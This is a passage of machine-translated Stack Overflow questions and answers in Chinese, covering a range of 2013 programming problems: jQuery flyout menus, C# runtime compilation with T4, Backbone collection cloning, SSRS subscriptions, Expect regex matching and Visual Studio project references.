我有这两个弹出菜单，它们可以分别进出和上下切换。当他们出去时，占据相同的空间，彼此重叠。它看起来并没有那么糟糕，但如果打开的菜单在另一个被点击打开时关闭会更好。将来可能会有两个以上的菜单。所以我需要一个解决方案，当你打开一个菜单时，它会同时关闭所有打开的菜单。我想他们需要一个与他们相关的课程。我不清楚如何关闭其他打开的菜单而不关闭我当时试图打开的菜单。希望这是有道理的。

```
showFooWindow = function() {
$('.channels-sessions-tab').click(function(){
    var $CSpane = $('.current-foo');

    var paneState = parseInt($CSpane.css('left'),10) == 0 ? -$CSpane.outerWidth()-11 : 0

    $CSpane.animate({
        left: paneState
    }, {
        duration: 700,
        specialEasing: {
            width: 'linear',
            height: 'easeOutBounce'
        }});
});
};

showBarWindow = function() {
$('.channel-session-tab').click(function(){
    var $CSpane = $('.current-bar');

    var paneState = parseInt($CSpane.css('top'),10) == 0 ? -$CSpane.outerHeight()-11 : 0

    $CSpane.animate({
        top: paneState
    }, {
        duration: 600,
        specialEasing: {
            width: 'linear',
            height: 'easeOutBounce'
        }});
});
}; 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T18:01:47.363

尝试添加如下内容：

```
$(".flownOut")./*close your flyouts*/.removeClass(".flownOut");
$CSpane.addClass("flownOut");
$CSpane.animate({
        left: paneState
    }, { .... the rest of your code 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-01T21:50:58.640

这就是我最终想出的。想出一个聪明的方法来抽象 flowOuRight 和 flynOutDown 会很酷。如果我这样做了，那么我可以删除几行代码。

```
showFoo = function() {
$('.foo-tab').click(function(){
    var duration = 700;
    var element = $('.foo');
    var direction = {left: parseInt(element.css('left'),10) == 0 ? -element.outerWidth()-11 : 0};
    closeOtherFlyouts();
    element.addClass("flownOutRight");
    flyoutAnimate(direction, duration, element);
});
};

showBar = function() {
$('.bar-tab').click(function(){
    var duration = 600;
    var element = $('.bar');
    var direction = {top: parseInt(element.css('top'),10) == 0 ? -element.outerHeight()-11 : 0};
    closeOtherFlyouts();
    element.addClass("flownOutDown");
    flyoutAnimate(direction, duration, element);
});
};

closeOtherFlyouts = function() {
if ($('.flownOutDown')) {
    var duration = 600;
    var element = $('.flownOutDown');
    var direction = {top: -element.outerHeight()-11};
    flyoutAnimate(direction, duration, element);
    element.removeClass("flownOutDown");
}

if ($('.flownOutRight')) {
    var duration = 700;
    var element = $('.flownOutRight');
    var direction = {left: -element.outerWidth()-11} ;
    flyoutAnimate(direction, duration, element);
    element.removeClass("flownOutRight");
}
};

flyoutAnimate = function(direction, duration, element) {
element.animate(
    direction,
    {
        duration: duration,
        specialEasing: {
            width: 'linear',
            height: 'easeOutBounce'
        }});
}; 
```

# c# - 使用 T4 和 C# 在运行时编译动态代码

> ID：15163949
> 
> 赞同：11
> 
> 时间：2013-03-01T17:56:08.840
> 
> 标签：c#, .net, code-generation, t4

我在 T4 上使用 TextTemplatingFilePreprocessor 阅读的文章展示了如何动态生成成为项目一部分并与项目一起编译的代码。

是否可以使用 T4 生成在运行时编译、输出到 dll 并加载和执行的代码，并且所述代码可以访问与 dll 相关的通常可见性功能？

如果是这样，请你给我举个例子。

我正在有效地尝试做与使用 IL 生成动态 dll 相同的事情，而是使用 C#。

**编辑**

我需要这个的具体情况很简单。我正在编写一个将消息路由到服务的消息路由器。服务可以是本地的或远程的。声明性脚本被编译成 C#。动态部分是“此服务是本地的还是远程的？”。输出 C# 相应更改。本地/远程的路由样式不同，因此具有动态性质。

这是我需要的一个例子。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-03-01T19:10:33.523

为此，您需要了解两件事：

1.  您可以使用运行时 T4 模板在运行时生成一些文本，包括 C# 源代码。
2.  您可以使用[`CSharpCodeProvider`](http://msdn.microsoft.com/en-us/library/microsoft.csharp.csharpcodeprovider.aspx)在运行时从文本编译程序集。或者您可以在生成的文本上手动运行 csc.exe（命令行 C# 编译器），但这会更复杂。（实际上`CSharpCodeProvider`在幕后就是这样做的。）

代码可能如下所示：

```
var template = new RuntimeTextTemplate();
string code = template.TransformText();

var compiler = new CSharpCodeProvider();
var result = compiler.CompileAssemblyFromSource(
    new CompilerParameters { OutputAssembly = "assembly.dll" }, code); 
```

# quickbooks - IPP 客户查询问题 - SyncManager 更新时间戳，即使没有进行任何更改

> ID：15163950
> 
> 赞同：0
> 
> 时间：2013-03-01T17:56:08.997
> 
> 标签：quickbooks, intuit-partner-platform

这种情况有解决方法吗？

1.  我以编程方式修改云中的客户。
2.  SyncManager 将该客户拉到 QuickBooks。
3.  我随后查询修改后的客户并让同一客户回来，因为 SyncManager 更新了时间戳，即使 QuickBooks 中没有发生真正的更改。

我需要一个等效于列表项的 StartCreatedTMS，以便我只提取在 QuickBooks 中进行物理修改的实体。

我试图将 StartCreatedTMS 标记插入到查询中，但它们被忽略了，表面上是因为它们是为事务设计的。

有任何想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-06T13:10:49.060

只是为了给这个线程一个答案，您可以使用公司文件的上次上传时间和上次回写时间。[http://docs.developer.intuit.com/0025_Intuit_Anywhere/0050_Data_Services/v2/0500_QuickBooks_Windows/0600_Object_Reference/Company](http://docs.developer.intuit.com/0025_Intuit_Anywhere/0050_Data_Services/v2/0500_QuickBooks_Windows/0600_Object_Reference/Company)

谢谢
震动

# javascript - 如何将模型从 Backbone 集合克隆到另一个集合

> ID：15163952
> 
> 赞同：3
> 
> 时间：2013-03-01T17:56:12.070
> 
> 标签：javascript, jquery, backbone.js, underscore.js, backbone.js-collections

我需要克隆一个主干集合中的模型，然后将它们添加到另一个。（IOW新集合中的所有模型都需要是唯一的，并且与原始集合中的模型没有联系。）

这是我的代码：

```
collection1.each(function( model ) {
  var clone = new Backbone.Model( model.toJSON() );
  clone.set( this.idAttribute, null, { silent: true });
  collection2.add( clone );
}); 
```

这不太行。我只能将一个模型从 collection1 添加到 collection2 一次。如果我再次尝试这样做，它会失败。所以不知何故，Backbone 正在检测一个 dup。

关于我做错了什么有什么建议吗？

在此先感谢您的帮助

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T19:06:48.857

在您提供的代码`this.idAttribute`中，可能不是您认为的那样，因此不会创建没有 ID 的模型，从而在您第二次复制模型时导致冲突。

下划线是 Backbone 的硬依赖，因此您可以使用[`_.omit`](http://documentcloud.github.com/underscore/#omit)集合的 JSON 表示来过滤掉 id。例如，

```
function copyCollection(collection1, collection2){
    var idAttribute = collection1.model.prototype.idAttribute;

    var data = _.map(
        collection1.toJSON(), 
        function(obj){ return _.omit(obj, idAttribute); }
    );

    collection2.add(data);
}

var c1 = new Backbone.Collection([
    {id: 1, name: "N1"},
    {id: 2, name: "N2"}
]);
var c2 = new Backbone.Collection();

copyCollection(c1, c2);
copyCollection(c1, c2);
console.log(c2.toJSON()); 
```

还有一个小提琴[http://jsfiddle.net/jT59v/](http://jsfiddle.net/jT59v/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-02-06T22:33:02.347

这是一个老问题，但@nikoshr 和[这个](https://stackoverflow.com/a/16424079/1356340)答案对我有帮助，所以我想添加我的贡献。

就我而言，我需要克隆一个包含嵌套集合的模型：

```
app.Collections.collection1 = Backbone.Collection.extend({
    model: app.Models.model1,
    clone: function() {
        return new this.constructor(_.map(this.models, function(model) { var clone = model.clone().unset('id', {silent: true}).unset('idAttribute', {silent: true}); return clone.set('collection2', clone.get('collection2').clone()); }));
    }
});

app.Collections.collection2 = Backbone.Collection.extend({
    model: app.Models.model2,
    clone: function() {
        return new this.constructor(_.map(this.models, function(model) { return model.clone().unset('id', {silent: true}).unset('idAttribute', {silent: true}); }));
    }
});

    var clone = this.model.clone().unset('id', {silent: true}).unset('idAttribute', {silent: true});
    clone.set('collection1', clone.get('collection1').clone());
    var copy = this.model.collection.add(clone, {parse: true}); 
```

所以在你的情况下，我猜你可以做这样的事情：

```
app.Collections.collection1 = Backbone.Collection.extend({
    clone: function() {
        return new this.constructor(_.map(this.models, function(model) { return model.clone().unset('idAttribute', {silent: true}); }));
    }
});

collection2.add(collection1.clone().models); 
```

# reporting-services - 我可以通过参数将连接字符串传递给子报表并用作订阅吗？

> ID：15163959
> 
> 赞同：1
> 
> 时间：2013-03-01T17:56:37.203
> 
> 标签：reporting-services, ssrs-2008-r2

我正在尝试获取带有子报告的 SSRS 报告以用作订阅，但失败了。手动执行时，报告工作正常。我正在尝试做的事情对于订阅来说可能太复杂了，但这里是一般的想法：

我的主报告中有一个非常简单的查询，它构建了一个数据库列表。比如说，我总共有 10 个数据库。我的主报告查询所有 10 个数据库并返回每个数据库的实际数据库名称。然后，主报表将每个数据库名称作为参数传递给我的子报表。

子报表通过以下方式在其连接字符串中使用每个数据库名称：`="Data Source=sql-server-name;" & "Initial Catalog=" & Parameters!ParentID.Value`

我遇到的问题是双重的：

1.  目前，在为我的主报告创建订阅时收到错误消息。我收到的错误消息是`Subscriptions cannot be created because the credentials used to run the report are not stored, or if a linked report, the link is no longer valid.`我已经尝试指定报表服务器上可用的每种可能的身份验证方法，包括“安全存储的凭据”、Windows 集成安全性等。
2.  有一次，我创建了一个订阅，但是当订阅尝试运行并发送电子邮件时，我收到的错误消息是：`The current action cannot be completed. The user data source credentials do not meet the requirements to run this report or shared dataset. Either the user data source credentials are not stored in the report server database, or the user data source is configured not to require credentials but the unattended execution account is not specified. (rsInvalidDataSourceCredentialSetting)`. 为了解决这个问题，我最近尝试按照[此处](https://stackoverflow.com/questions/11139777/anyone-seen-this-the-user-data-source-credentials-do-not-meet-the-requirements)的建议创建一个“无人值守执行帐户” ，但无法证明它是否有效，因为目前我无法修改我的订阅来安排测试（由于问题 #1）。

我可以通过参数将连接字符串传递给子报表并让主报表作为订阅执行吗？如果是这样，怎么做？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-19T23:37:13.003

首选方法是使用内置操作选项转到子报表，而不是使用连接字符串。在属性中，转到操作并选择“转到报告”。指定报告后，您可以添加要发送的参数列表。您甚至可以使用函数来确定要传递的值。

# java - javah 在 jdk1.6 上未发现错误，但在 jdk1.7 上未发现错误

> ID：15163960
> 
> 赞同：2
> 
> 时间：2013-03-01T17:56:41.717
> 
> 标签：java, java-7, jdk1.6

如果我跑

```
"C:\Program Files\Java\jdk1.6.0_24\bin\javah.exe" HelloWorld 
```

我明白了

```
error: cannot access HelloWorld 
```

但与

```
"C:\Program Files\Java\jdk1.7.0_15\bin\javah.exe" HelloWorld 
```

生成 HelloWorld.h

怎么了？我在PATH上有1.7，以防它相关......

```
class HelloWorld {
 private native void print();
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2014-03-25T18:50:16.147

在我的情况下，问题是 java7 可以使用 .java 文件作为输入，但 java6 似乎需要 .class 文件。将 -classpath 的值从 src 更改为 bin 为我解决了这个问题。

即，当我的文件看起来像：

```
src/pkg/Hello.java
bin/pkg/Hello.class 
```

我可以做任何这些：

```
$JAVA_6/javah -classpath -jni -d . -classpath bin pkg.Hello
$JAVA_7/javah -classpath -jni -d . -classpath bin pkg.Hello
$JAVA_7/javah -classpath -jni -d . -classpath src pkg.Hello 
```

但不是这个：

```
$JAVA_6/javah -classpath -jni -d . -classpath src pkg.Hello 
```

我在linux上使用openjdk。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-10T16:45:46.203

在 java6 下编译时我无法复制它。也许你用java7编译了你的类文件，而用你的java6 Jdk打包的Javah无法读取它。

# php - 获取上次保存的对象 ID

> ID：15163966
> 
> 赞同：0
> 
> 时间：2013-03-01T17:57:27.223
> 
> 标签：php, mysql, crud, fuelphp

我正在使用 Model_CRUD 类，它是在数据库中保存和查找的方法。将新对象保存到数据库时出现问题，如何获取最后插入的 id ？

```
User::forge($userInfo)->save(); // Save returns only bool value 
```

这是否需要一个查询才能获得最后插入的 id ？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-01T20:51:33.907

您不必执行额外的查询来获取最后插入的 id。只需尝试以下代码：

```
$user = User::forge($userInfo);
$user->save();

$last_id = $user->id; 
```

您应该查看[Model_Crud](http://fuelphp.com/dev-docs/classes/model_crud/methods.html)文档以获取更多信息。

# compilation - ECL - 为每个编译单元及其依赖项转储 c 源代码？

> ID：15163967
> 
> 赞同：7
> 
> 时间：2013-03-01T17:57:33.507
> 
> 标签：compilation, lisp, asdf, ecl

我有以下包定义。如何递归编译所有组件，***以及它们***对 C 源代码的依赖关系？换句话说，我想保留**所有**用于构建本机可执行文件的 C 文件。

目前，我使用`(asdf:make-build :example`但不会留下任何 C 文件。

我期待看到

```
simple.c
simple.h
simple.data
cl-opengl.c
cl-opengl.h
... 
```

*示例.asd：*

```
(defsystem :example
  :depends-on (:cl-opengl :cl-glu :cl-glut)
  :serial t
  :components ((:file "simple"))) 
```

*cl-opengl.asd：*

```
(defsystem cl-opengl
  :description "Common Lisp bindings to OpenGL."
  :depends-on (cffi alexandria)
  :components
  ((:module "gl"
    :components
    ((:file "bindings-package")
     (:file "constants" :depends-on ("bindings-package"))
     (:file "library" :depends-on ("bindings-package"))
     (:file "bindings" :depends-on ("bindings-package" "constants" "library"))
     ... 
```

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-03-02T10:48:37.510

As explained in the ECL mailing list, setting c::*delete-files* to NIL will prevent the compiler from deleting the intermediate C files. They have extensions *.c, *.eclh (header) and *.data (text definitions of objects), but their names are massaged by ASDF (they get some ASDF- prefix IIRC) and they are not created where the lisp sources live, but rather at ASDF's cache directory (typically ~/.cache/common-lisp/ecl-...)

# javascript - 为什么javascript函数需要return？

> ID：15163972
> 
> 赞同：0
> 
> 时间：2013-03-01T17:58:03.160
> 
> 标签：javascript

当我执行以下`JavaScript`代码时，我得到了`undefined`

```
var ns=new String('hello world');
String.prototype.capitalAll=function(){
                                 this.toUpperCase()
                                       };
alert(ns.capitalAll()); // undefined 
```

但是，当我添加时`return`，它会返回一个值

```
var ns=new String('hello world');
String.prototype.capitalAll=function(){
                                 return this.toUpperCase() // added return
                                       };
alert(ns.capitalAll()); // HELLO WORLD 
```

为什么`return`在这里和每个函数的末尾都需要。我已经看到`return`在许多`javascript`框架中使用。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T17:59:43.240

否则您将如何从函数调用中返回数据？

像这样的函数`Array.prototype.shift()`是变革性的，因为它们修改了数组。在内部，他们会做类似的事情`this[this.length] = newvalue`并以某种方式实际修改`this`。

但是大多数函数都不是变革性的，它们会返回结果。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-01T18:01:38.797

`return`允许您定义函数在调用时传回的内容。

它不需要有返回值，你可以有一个什么都不返回的函数，它只是修改其他变量或打印一些东西然后继续。

`undefined`当您没有明确指定要返回的另一个值时返回

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-01T18:26:44.140

[toUpperCase 的作用：](https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Global_Objects/String/toUpperCase)

问题是 toUpperCase 首先没有修改“this”。那是一个返回值的函数。

一些方法会修改它们被调用的对象（它们会修改“this”）。在这些情况下，您可以像拥有它一样编写函数。但是，在这种情况下，您需要使用“return”值。

# paypal-adaptive-payments - 不支持订阅配置文件

> ID：15163980
> 
> 赞同：1
> 
> 时间：2013-03-01T17:58:21.937
> 
> 标签：paypal-adaptive-payments, paypal-subscriptions

PayPal 订阅是根据 PayPal 网站标准创建的，订阅者 ID 以“I”开头。当我将`getrecurringpaymentsprofiledetails`其显示在错误下方时`subscription profiles not supported`。让我知道在不使用 IPN 的情况下获取使用 PayPal 标准创建的订阅详细信息的任何其他方式。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T18:04:26.847

不幸的是，不依赖 IPN 然后对您自己的数据库运行查询是不可能的。这些 API 主要用于定期付款（通过`CreateRecurringPayments`API 调用通过 Express Checkout Recurring Payments 创建的那些），而不是您设置的网站付款标准订阅。您可以针对订阅使用循环 API 执行一些操作，但订阅并不支持所有功能。这将是其中之一。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2019-07-07T18:49:52.303

我通过这种方式得到它：

```
let options = {
 method: 'post', headers: {'content-type':'application/json','Access-Control-Allow-Credentials':true},
 auth:{'username':process.env.PAYPALID,'password':process.env.PAYPALPASSWORD},
 url: 'https://api.paypal.com/v1/oauth2/token',
 data: 'grant_type=client_credentials',
}
axios(options).then((response)=>{let paypaltoken=response.data.access_token
axios.get('https://api.paypal.com/v1/payments/billing-agreements/'+agreementid+'/transactions?start_date=2018-01-01&end_date=2019-07-07', { headers: { 'Authorization':'Bearer '+paypaltoken, 'Content-Type':'application/json', } })
.then((transaction)=>{console.log(transaction.data)})
.catch(err => {console.error(err);console.log('err: '+JSON.stringify(err)); res.send (err) })
})
.catch(err => {console.error(err);console.log('err: '+JSON.stringify(err)); res.send (err) }) 
```

那么如果你只得到transaction.data，你会得到一系列的事务对象，只有当事务正常时才`status`== `Completed`，也就是说，它没有被取消，所以为了计划控制目的，只检查最后一个。什么时候`status`==`Canceled`您知道该协议不再有效。

如果您收到每月付款，另一种方法是将第一个日期设置为从“now()”开始的 2 个月，将第二个日期设置为“now()”。如果您没有交易，则状态可能不活跃，但请仔细检查：随机可能存在信用卡问题。在那种情况下，我想`status`可能是 == to`delayed`或其他东西，但我无法测试它，所以我不知道。这个想法来自这个[问题](https://stackoverflow.com/questions/29080544/subscription-profiles-not-supported-by-recurring-payment-apis-while-updating-pla)和值得我感谢的相对第二个答案。

请注意，根据您的情况，您可能需要在请求中添加`'Access-Control-Allow-Credentials':true`标题而不是其他`withCredentials: true`或类似的。

# c# - Dynamic LINQ to DataTable：为什么使用硬编码字符串“it”作为 DataRow

> ID：15163985
> 
> 赞同：5
> 
> 时间：2013-03-01T17:58:36.767
> 
> 标签：c#, linq, dynamic-linq

假设我有一个`DataTable`三列`C1`, `C2`, `C3`:

```
var dt = new DataTable();
dt.Columns.Add("C1", typeof (int));
dt.Columns.Add("C2", typeof (string));
dt.Columns.Add("C3", typeof(string));

dt.Rows.Add(1, "1", "1");
dt.Rows.Add(1, "1", "2");
dt.Rows.Add(1, "2", "2"); 
```

我[在 nuget](https://www.nuget.org/packages/System.Linq.Dynamic) to `GroupBy`columns上使用 Dynamic Linq `C1`，`C2`就像下面的代码一样，它工作得很好：

```
 var output = dt.AsEnumerable()
            .AsQueryable()
            .GroupBy("new(it[\"C1\"] as C1, it[\"C2\"] as C2)", "it"); 
```

如果您注意到，有一个*硬编码字符串* `it`可以显示为`DataRow`，我的这个想法来自：

[动态 Linq GroupBy](https://stackoverflow.com/questions/3469694/dynamic-linq-groupby)

. 如果我尝试更改`it`为字符串`row`，例如：

```
GroupBy("new(row[\"C1\"] as C1, row[\"C2\"] as C2)", "row"); 
```

我会得到运行时错误：

> > “DataRow”类型中不存在属性或字段“行”

所以，我不太清楚为什么必须*硬编码* `it`为`DataRow`？这有什么原因吗。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T18:04:12.413

这就是动态 LINQ 提供程序的编写方式。它具有三个硬编码关键字，当它尝试解析 LINQ 表达式时会识别这些关键字：`it`、`iff`和`new`：

```
static readonly string keywordIt = "it";
static readonly string keywordIif = "iif";
static readonly string keywordNew = "new"; 
```

如果您想查看更多详细信息，可以自己检查 LINQ 程序集的[源代码。](https://github.com/kahanu/System.Linq.Dynamic/blob/master/Src/System.Linq.Dynamic/DynamicLinq.cs)

（顺便说一句：如果我不得不猜测的话，这里的“它”似乎是“标识符令牌”的缩写。）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-01T18:03:20.920

好吧，我想他们不得不将枚举中的当前对象称为“某物”，因此“**它**”似乎是一个合理的选择。

# c#-4.0 - 在实体框架中的使用块中通过引用传递 DbContext

> ID：15163986
> 
> 赞同：4
> 
> 时间：2013-03-01T17:58:43.947
> 
> 标签：c#-4.0, entity-framework-5

我正在尝试将一系列数据库更新包装在事务范围内。我遇到了第一个数据库更新工作的问题，但第二个会失败。我认为这与我通过价值将 DbContext 传递给方法的报酬有关......本质上是在被调用的方法中创建它的副本（对吗？）。因此，我认为这导致了上下文没有保持完整的事务问题......这略高于我目前的理解水平并试图学习，但这是我目前的假设。

因此，我认为我需要通过引用将 DbContext 传递给被调用的方法，但随后会收到有关局部变量分配不正确的警告。

那么如何通过从 using 块中调用子方法来使用此封装并保持 DbContext 完整性？

这是我的包装方法：

```
// define our transaction scope
                var scope = new TransactionScope(
                    // a new transaction will always be created
                    TransactionScopeOption.RequiresNew,
                    // we will allow volatile data to be read during transaction
                    new TransactionOptions()
                    {
                        IsolationLevel = IsolationLevel.ReadUncommitted
                    }
                );

                try
                {
                    // use the scope we just defined
                    using (scope)
                    {
                        // create a new db context
                        var ctx = new InventoryMgmtContext();
                        using (ctx)
                        {
                            //Initial count of rows in Alloc Needs
                            System.Diagnostics.Debug.WriteLine("Begin Alloc Need Recs: " + ctx.AllocationNeeds.Count().ToString());

                            //De-Allocate inventory container dtls
                            var deAllocInvenResult = DeAllocInvenForNeed(ref ctx, intFacilityId, needSourceType, intNeedSourceId, intUserId);

                            //Delete Allocation Need and Allocated Ctnr records
                            var deleteAllocNeedResult = DeleteAllocRecords(
                                ref ctx,
                                intFacilityId,
                                needSourceType,
                                intNeedSourceId
                            );

                            //var repository = new Repository<AllocationNeed>(ctx);

                        }
                        // everything good; complete
                        scope.Complete();
                    } 
```

这是进行更新的子方法之一：

```
//Delete Allocation Need and AllocatedContainers for alloc need id
        private ActionConfirmation<int> DeleteAllocRecords(
            ref InventoryMgmtContext ctx,
            int intFacilityId,
            AllocationNeed.NeedSourceTypeOptions needSourceType,
            int intNeedSourceId
        )
        {
            var repository = new Repository<AllocationNeed>(ctx);

            //Delete Allocation Need and hence children in Allocated Containers
            var srcType = needSourceType.ToString();
            AllocationNeed allocNeed = repository.SearchFor(
                x => x.FacilityId == intFacilityId
                && x.NeedSourceType == srcType
                && x.NeedSourceId == intNeedSourceId
            ).First();

            //return repository.Delete(allocNeed, true);
            ctx.Entry(allocNeed).State = System.Data.EntityState.Deleted;
            ctx.SaveChanges();

            //Deallocation was successful
            return ActionConfirmation<int>.CreateSuccessConfirmation(
                string.Format(
                    "Successfully deleted Need Id: {0} {1}",
                    needSourceType.ToString(),
                    intNeedSourceId
                ),
                intNeedSourceId
            );
        } 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-04T15:52:21.647

我必须传递一个版本的上下文的假设是不正确的。我在[这里](http://www.programminginterviews.info/2012/06/entity-framework-transaction-scope.html?m=1)找到了一篇很好的文章，它解释了如何围绕多个上下文包装事务。

# regex - 澄清期望脚本正则表达式评估

> ID：15163987
> 
> 赞同：1
> 
> 时间：2013-03-01T17:58:44.177
> 
> 标签：regex, syntax, match, expect

我一直在自学期望脚本，并且我有一些关于期望脚本正则表达式的澄清问题。我创建了一个生成 Sun iLOM ssh 会话然后启用 SNMP 代理的代码。事实证明 iLOM2 和 iLOM3 处理这个过程的方式不同，所以我创建了这个脚本来解决这个问题。在试图弄清楚如何正确地进行正则表达式匹配时，我在网上遇到了许多相互冲突的解决方案，现在我很困惑。我找到的最好的帮助是[expect 联机帮助页](http://www.tcl.tk/man/expect5.31/expect.1.html)。我设法让某些东西起作用，但我担心我的解决方案很脏，并且与我找到的任何示例都不匹配。所以我的实际问题是：我的代码是如何工作的？有没有更好的办法？

我希望更多地了解 Expect 脚本，而不是盲目地将自定义解决方案组合在一起。

**注意：**同样，此代码有效。我想知道它是如何评估的。

要捕获的输出：

```
spawn ssh -o StrictHostKeyChecking=no root@<host>
Password: 

Sun(TM) Integrated Lights Out Manager

Version 2.0.2.6

Copyright 2008 Sun Microsystems, Inc. All rights reserved.
Use is subject to license terms.

-> 
```

这个想法是捕捉“版本2”。然后从那里提取数字 2。

期望脚本片段：

```
set prompt "\\\->"
send "$pwd\r"
    expect {
            timeout { ...timeout action... }
            $prompt { ...regex didn't match action... }
            -indices -re {(Version (\d+).)} {
            #Regex to find ILOM Version.
                    if {[info exists expect_out(2,string)]} {
                            set ilom_version $expect_out(2,string)
                    } else { ...regex didn't match properly action...  }
                    expect $prompt
            }
    } 
```

确切的正则表达式是*-indices -re {(Version (\d+).)}*。我花了很长时间才最终找出一种有效的语法，因为我上面链接的期望手册页有完全不同的示例。ie: *-re "failed|invalid password"*每当我采用这种语法时，一切都会崩溃。*“版本”、版本、{版本}、（版本）*全部失败。

所以我想我只是对我的代码是如何工作的以及为什么它与我发现的所有示例如此不同感到困惑。任何想法或建议将不胜感激。感谢您的时间。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T18:58:48.540

正则表达式是用`{}`.

```
(Version (\d+).) 
```

它将匹配一个字符串，该字符串`Version`后跟一个空格，然后是一个或多个数字，后跟任何字符之一。点是匹配任意字符的通配符；如果你想匹配文字`.`使用`\.`。

您已将模式包含在其中，`()`因此整个匹配项将被捕获并保存在`expect_out(1,string)`. 但是作为*a）*您没有使用整个匹配，并且*b）*无论如何都会自动保存整个匹配`expect_out(0,string)`，因此不需要外括号。

您还包含了`\d+`中括号，因此版本号的前导数字将被捕获并保存在 中`expect_out(2,string)`，但是如果您按照上面的建议删除外括号，它将保存在`expect_out(1,string)`.

数字后面的the`.`或 a`\.`并没有真正起到任何作用，除了如果该字符不存在则阻止匹配。

该`-indices`标志是不必要的，因为您不是在寻找匹配的索引。

否则，您提取版本号的方法看起来不错 - 虽然，我对 Expect 几乎一无所知 :)

# jquery - 如何在jquery对话框旁边放一张图片？

> ID：15163993
> 
> 赞同：-2
> 
> 时间：2013-03-01T17:58:57.063
> 
> 标签：jquery, css, jquery-ui

我没有找到可以谈论这个的话题，如果没有正确研究，我深表歉意。有没有办法将图片放在 jquery 对话框旁边，如下图所示？如果是怎么办？

![对话](../Images/c0e23d3c8218a3504adb19ff6e0d147b.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T18:33:20.533

工作示例：http: [//jsfiddle.net/BwQzs/5/](http://jsfiddle.net/BwQzs/5/)

html:

```
<div id="dialog" title="Basic dialog">
  <p>A dialog...</p>
</div>
<img style="position: absolute; top:0; left:0; width: 70px;" id="dialogimage" src="https://twimg0-a.akamaihd.net/profile_images/3167619400/f6e8d4a5be06c62a6ea863c3d6dce875.png" /> 
```

js：

```
 $(function(){
    $( "#dialog" ).dialog({

        open: function( event, ui ) {
          $('#dialogimage').css({
              left:$(this).offset().left-75,
              top:$(this).offset().top-46
            });
        },
        drag: function( event, ui ) {
            $('#dialogimage').css({
                left:ui.position.left-70,
                top:ui.position.top,display:'block'
            });
        }
    });
}) 
```

# c# - 将我拥有其代码的所有项目添加到解决方案中会更好吗？还是只添加 dll 引用？

> ID：15163996
> 
> 赞同：3
> 
> 时间：2013-03-01T17:59:07.133
> 
> 标签：c#, .net, visual-studio-2010, visual-studio, projects-and-solutions

我需要证据和资源，我有很多项目，彼此相关，我很想得到他们的代码，我只处理其中的一小部分，我有其他项目的所有二进制文件的最新版本，最好只添加我使用的项目并将引用添加为 dll 引用，或者添加其他项目，即使我不需要更改它们或查看它们。

这是个人喜好吗？为什么？最佳做法是什么？

注意：项目数量正在增加，现在是：25 个项目，而且还在增加！

请提供参考和链接，而不是一般的答案。

注：所有项目均由我们团队开发，并非外部开源项目

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-03-01T18:09:43.550

这不是个人喜好。

只要有可能，您应该引用项目本身而不是它们产生的 DLL。原因如下：

*   构建调试和发布将产生一致的输出
*   不会有过时的引用
*   VS 知道当某些事情发生变化时要构建什么，特别是当您链接引用 A->B->C 时，如果使用 DLL，更改 A 的 dll 不会导致 C 被重建

唯一可能担心的是您正在使用多少个项目。如果太多，则将解决方案分解为每个部分本身一致并引用所有涉及的项目的部分，因此解决方案A 具有 Project1、Project2、Project3 和 SolutionB 具有 Project3、Project4 和 Project5，但构建任何一个仍然会产生一致的构建。Sill 保留一个解决方案，其中包含所有用于发布版本的项目。

25 个项目仍然可以管理。您还可以拥有一个解决方案，其中项目分组在不同的解决方案文件夹下，因此它不是 VS 解决方案资源管理器中的 25 个大列表，但它们仍然同时构建。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-01T18:07:02.417

解决方案中的每个项目都被引用为 DLL。所以这是一样的。唯一的区别是，如果您不必经常更改 25 个项目中的任何一个中的某些代码，那么每次进行重建时都会非常糟糕。

问题如下： 构建解决方案时，如果引用的项目没有更改，则不会构建。因此，这与解决方案中没有所有项目相同。

但是，如果您进行清理和构建，解决方案中的所有项目 DLL 都将被删除，并且所有项目都将重新构建。这将需要更长的时间。

这是我目前唯一能想到的两件事。